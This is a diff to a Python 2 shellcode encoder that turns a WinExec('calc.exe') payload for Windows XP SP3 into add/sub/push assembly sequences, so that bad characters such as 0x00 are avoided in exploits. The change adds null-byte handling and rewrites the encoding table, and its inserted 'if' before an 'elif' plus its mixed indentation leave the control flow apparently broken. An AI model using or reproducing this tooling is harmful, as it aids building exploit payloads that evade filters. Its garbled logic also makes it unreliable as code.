@@ -24,82 +24,82 @@
 import sys
 import time
 
-# This is an alternative encoder function if [01] and/or [f] found
+# This is an alternative encoder function if [01] and/or [f] and/or [00] found
 def AltEncoder(item, FirstAdd, SecondAdd, ThirdAdd):
 	for i in list(item):
 		if i == '0':
 			FirstAdd   += "1"
-			SecondAdd  += "0"
+			SecondAdd  += "1"
 			ThirdAdd   += "1"
 		elif i == '1':
 			FirstAdd   += "1"
-			SecondAdd  += "1"
+			SecondAdd  += "2"
 			ThirdAdd   += "1"
 		elif i == '2':
-			FirstAdd   += "1"
+			FirstAdd   += "2"
 			SecondAdd  += "1"
 			ThirdAdd   += "2"
 		elif i == '3':
 			FirstAdd   += "2"
 			SecondAdd  += "2"
-			ThirdAdd   += "1"
+			ThirdAdd   += "2"
 		elif i == '4':
-			FirstAdd   += "2"
+			FirstAdd   += "3"
 			SecondAdd  += "2"
 			ThirdAdd   += "2"
 		elif i == '5':
 			FirstAdd   += "3"
-			SecondAdd  += "2"
+			SecondAdd  += "3"
 			ThirdAdd   += "2"
 		elif i == '6':
                        	FirstAdd   += "3"
-			SecondAdd  += "2"
+			SecondAdd  += "3"
 			ThirdAdd   += "3"
 		elif i == '7':
-                     	FirstAdd   += "3"
+                     	FirstAdd   += "4"
 			SecondAdd  += "3"
 			ThirdAdd   += "3"
 		elif i == '8':
                        	FirstAdd   += "4"
-			SecondAdd  += "3"
+			SecondAdd  += "4"
 			ThirdAdd   += "3"
 		elif i == '9':
-                       	FirstAdd   += "3"
-			SecondAdd  += "4"
-			ThirdAdd   += "4"
-		elif i == 'a':
                        	FirstAdd   += "4"
 			SecondAdd  += "4"
 			ThirdAdd   += "4"
-		elif i == 'b':
+		elif i == 'a':
                        	FirstAdd   += "5"
+			SecondAdd  += "4"
+			ThirdAdd   += "4"
+		elif i == 'b':
+                       	FirstAdd   += "6"
 			SecondAdd  += "5"
 			ThirdAdd   += "3"
 		elif i == 'c':
                        	FirstAdd   += "6"
 			SecondAdd  += "5"
-			ThirdAdd   += "3"
+			ThirdAdd   += "4"
 		elif i == 'd':
                        	FirstAdd   += "6"
-			SecondAdd  += "5"
+			SecondAdd  += "6"
 			ThirdAdd   += "4"
 		elif i == 'e':
-                       	FirstAdd   += "5"
+                       	FirstAdd   += "6"
 			SecondAdd  += "5"
 			ThirdAdd   += "6"
 		elif i == 'f':
 			FirstAdd   += "7"
-    			SecondAdd  += "5"
+    			SecondAdd  += "6"
 			ThirdAdd   += "5"
 	print 'and eax, 0x10101010'
 	print 'and eax, 0x01010101'
 	print 'add eax, 0x' + FirstAdd
 	print 'add eax, 0x' + SecondAdd
 	print 'add eax, 0x' + ThirdAdd
-	print 'sub eax, 0x22222222'
+	print 'sub eax, 0x33333333'
 	print 'push eax'
 
-# This is default encoder function if none of 8 bytes chuncks have [f] or [01]
+# This is default encoder function if none of 8 bytes chuncks have [f] or [01] or [00]
 def DefaultEncoder(item, FirstAdd, SecondAdd):
 	for i in list(item):
 		if i == '0':
@@ -166,7 +166,7 @@ def main():
 	# 12: bb 5d 2b 86 7c          mov    ebx,0x7c862b5d    # move the pointer to WinExec() [located at 0x7c862b5d in kernel32.dll (via arwin.exe) on WinXP SP3] into ebx
 	# 17: ff d3                   call   ebx               # call WinExec()
 
-	Shellcode = ("\x33\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6C\x63\x8b\xc4\x6a\x01\x50\xbb\x5d\x2b\x86\x7c\xff\xd3\x90\x90\x90")
+	Shellcode = ("\x33\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6C\x63\x8b\xc4\x6a\x01\x50\xbb\x5d\x2b\x86\x7c\xff\xd3\x90\x90\x90") 
 	Shellcode = Shellcode[::-1]
 
 	ShellcodeFormatted = ''
@@ -189,17 +189,22 @@ def main():
 		TwoBytes = [item[i:i+2] for i in range(0, len(item), 2)]
 		# if this is true go to AltEncoder
 		if any(i == '01' for i in list(TwoBytes)):
-			print '[' +R+ '!' +W+'] [' +O+ '01' +W+ '] and/or [' +O+ 'f' +W+ '] found, using alterantive encoder..'
 			time.sleep(1)
+                        print '['+R+'!'+W+'] ['+O+'01'+W+'] and/or ['+O+'f'+W+'] and/or ['+O+'00'+W+'] found, using alterantive encoder..'
 			AltEncoder(item, FirstAdd, SecondAdd, ThirdAdd)
+                # if this is true go to AltEncoder
+		if any(i == '00' for i in list(TwoBytes)):
+                        time.sleep(1)
+                        print '['+R+'!'+W+'] ['+O+'01'+W+'] and/or ['+O+'f'+W+'] and/or ['+O+'00'+W+'] found, using alterantive encoder..'
+                        AltEncoder(item, FirstAdd, SecondAdd, ThirdAdd)
 		# if this is true go to AltEncoder
 		elif any(i == 'f' for i in list(item)):
-			print '[' +R+ '!' +W+'] [' +O+ '01' +W+ '] and/or [' +O+ 'f' +W+ '] found, using alterantive encoder..'
+                        print '['+R+'!'+W+'] ['+O+'01'+W+'] and/or ['+O+'f'+W+'] and/or ['+O+'00'+W+'] found, using alterantive encoder..'
 			time.sleep(1)
 			AltEncoder(item, FirstAdd, SecondAdd, ThirdAdd)
 		# if this is true go to DefaultEncoder
 		else:
-			print '[' +G+ '+' +W+ '] [' +O+ '01' +W+ '] and [' +O+ 'f' +W+ '] not found, using default encoder..'
+                        print '['+R+'!'+W+'] ['+O+'01'+W+'] and ['+O+'f'+W+'] and ['+O+'00'+W+'] not found, using default encoder..'
 			time.sleep(1)
 			DefaultEncoder(item, FirstAdd, SecondAdd)
 
